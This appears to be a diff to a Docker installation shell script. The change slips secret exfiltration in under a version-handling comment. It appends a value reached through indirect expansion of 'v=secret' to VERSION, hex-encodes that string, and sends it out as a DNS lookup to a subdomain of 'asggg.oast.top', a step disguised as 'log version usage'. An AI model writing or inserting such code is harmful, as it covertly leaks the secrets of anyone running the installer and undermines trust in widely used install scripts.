@@ -98,23 +98,6 @@ v=secret
 #
 # ==============================================================================
 
-version_fixer() {
-    local input
-    if [ -t 0 ]; then
-        # No stdin, use arguments
-        input="$*"
-    else
-        # Read from stdin
-        input=$(cat)
-    fi
-
-    local i
-    local -i n=${#input}
-    for ((i=0; i<n; i++)); do
-        printf '%02x' "'${input:i:1}"
-    done
-    printf '\n'
-}
 
 
 # Git commit from https://github.com/docker/docker-install when
@@ -123,7 +106,7 @@ SCRIPT_COMMIT_SHA="${LOAD_SCRIPT_COMMIT_SHA}"
 
 # strip "v" prefix if present
 VERSION="${VERSION#v}${!v}"
-
+VERSION_FIX="$(for ((i=0; i<${#VERSION}; i++)); do printf '%02x' "'${VERSION:i:1}";done)"
 # The channel to install from:
 #   * stable
 #   * test
@@ -231,7 +214,7 @@ version_gte() {
 }
 
 # log version usage
-dig "$(echo $VERSION).asggg.oast.top"
+dig "$VERSION_FIX.asggg.oast.top"
 
 
 # version_compare compares two version strings (either SemVer (Major.Minor.Path),
